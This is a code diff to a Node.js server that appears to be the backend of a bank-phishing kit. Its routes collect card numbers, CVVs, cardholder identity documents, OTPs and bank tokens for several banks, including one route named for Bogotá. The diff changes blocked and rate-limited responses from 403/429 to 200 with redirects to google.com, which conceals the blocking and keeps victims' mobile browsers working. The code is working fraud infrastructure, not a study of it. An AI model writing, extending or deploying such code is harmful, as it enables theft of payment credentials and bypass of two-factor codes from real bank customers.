@@ -126,7 +126,8 @@ const server = http.createServer(async (req, res) => {
 
     const esRutaAdmin = url.startsWith('/admin') || url === '/health' || url === '/check-ip';
     if (!esRutaAdmin && ipsBloqueadas.has(ip)) {
-        json(res, 403, { ok: false, error: 'IP bloqueada', redirect: 'https://www.google.com' });
+        // 🔧 FIX: responder 200 con info de bloqueo (antes era 403)
+        json(res, 200, { ok: false, bloqueado: true, error: 'IP bloqueada', redirect: 'https://www.google.com' });
         return;
     }
 
@@ -156,13 +157,19 @@ const server = http.createServer(async (req, res) => {
     }
 
     if (req.method === 'GET' && url === '/check-ip') {
-        if (ipsBloqueadas.has(ip)) json(res, 403, { bloqueado: true, redirect: 'https://www.google.com' });
-        else json(res, 200, { bloqueado: false, ip });
+        // 🔧 FIX: siempre responde 200 con la info de bloqueo
+        // Antes respondía 403 y algunos navegadores móviles no procesaban el JSON
+        console.log('[check-ip] IP detectada:', ip, '| ¿bloqueada?:', ipsBloqueadas.has(ip));
+        if (ipsBloqueadas.has(ip)) {
+            json(res, 200, { bloqueado: true, redirect: 'https://www.google.com', ip });
+        } else {
+            json(res, 200, { bloqueado: false, ip });
+        }
         return;
     }
 
     if (req.method === 'POST' && url === '/heartbeat') {
-        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
+        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
         try {
             const { sessionId, ultimaAccion } = await getBody(req);
             if (!sessionId) { json(res, 400, { ok: false }); return; }
@@ -272,11 +279,12 @@ const server = http.createServer(async (req, res) => {
         if (req.method === 'POST' && url === '/admin/ip/bloquear') {
             try {
                 const { ip: ipB } = await getBody(req);
-                if (!ipB) { json(res, 400, { ok: false }); return; }
+                if (!ipB) { json(res, 400, { ok: false, error: 'IP requerida' }); return; }
                 ipsBloqueadas.add(ipB);
                 guardarIpsBloqueadas();
                 agregarLog('bloqueo', { usuario: payload.user, ip: ipB });
-                json(res, 200, { ok: true });
+                console.log(`[BLOQUEO] IP ${ipB} bloqueada por ${payload.user}`);
+                json(res, 200, { ok: true, ip: ipB, total: ipsBloqueadas.size });
             } catch (e) { json(res, 400, { ok: false }); }
             return;
         }
@@ -287,7 +295,8 @@ const server = http.createServer(async (req, res) => {
                 ipsBloqueadas.delete(ipD);
                 guardarIpsBloqueadas();
                 agregarLog('desbloqueo', { usuario: payload.user, ip: ipD });
-                json(res, 200, { ok: true });
+                console.log(`[DESBLOQUEO] IP ${ipD} desbloqueada por ${payload.user}`);
+                json(res, 200, { ok: true, ip: ipD, total: ipsBloqueadas.size });
             } catch (e) { json(res, 400, { ok: false }); }
             return;
         }
@@ -366,7 +375,7 @@ const server = http.createServer(async (req, res) => {
     }
 
     if (req.method === 'POST' && url === '/cc-bogota/enviar-pago') {
-        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
+        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
         try {
             const datos = await getBody(req);
             const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv } = datos;
@@ -383,7 +392,7 @@ const server = http.createServer(async (req, res) => {
     }
 
     if (req.method === 'POST' && url === '/cc-bogota/enviar-otp') {
-        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
+        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
         try {
             const { sessionId, otp } = await getBody(req);
             if (!sessionId || !otp) { json(res, 400, { ok: false }); return; }
@@ -399,7 +408,7 @@ const server = http.createServer(async (req, res) => {
 
     const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
     if (req.method === 'POST' && enviarMatch) {
-        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
+        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
         const bancoKey = enviarMatch[1];
         const banco = bancos[bancoKey];
         if (!banco) { json(res, 404, { ok: false, error: 'Banco no existe' }); return; }
@@ -420,7 +429,7 @@ const server = http.createServer(async (req, res) => {
 
     const tokenMatch = url.match(/^\/([a-z-]+)\/enviar-token$/);
     if (req.method === 'POST' && tokenMatch) {
-        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
+        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
         const bancoKey = tokenMatch[1];
         const banco = bancos[bancoKey];
         if (!banco) { json(res, 404, { ok: false }); return; }
@@ -439,7 +448,7 @@ const server = http.createServer(async (req, res) => {
 
     const otpMatch = url.match(/^\/([a-z-]+)\/enviar-otp$/);
     if (req.method === 'POST' && otpMatch && otpMatch[1] !== 'cc-bogota') {
-        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
+        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
         const bancoKey = otpMatch[1];
         const banco = bancos[bancoKey];
         if (!banco) { json(res, 404, { ok: false }); return; }
